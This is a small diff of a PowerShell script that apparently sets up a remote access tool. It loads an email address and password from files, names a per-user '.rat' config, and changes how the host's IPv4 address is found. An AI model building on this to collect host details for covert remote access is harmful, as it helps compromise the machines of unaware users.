@@ -37,7 +37,7 @@ $initial_dir = Get-Location
 $configfile = "$env:UserName.rat"
 $email = Get-Content email.txt
 $eword = Get-Content eword.txt
-$ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress
+$ip = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null}).IPv4Address.IPAddress
 
 # writes config file
 Add-Content -Path $initial_dir/coller.cmd -Value "@echo off" 
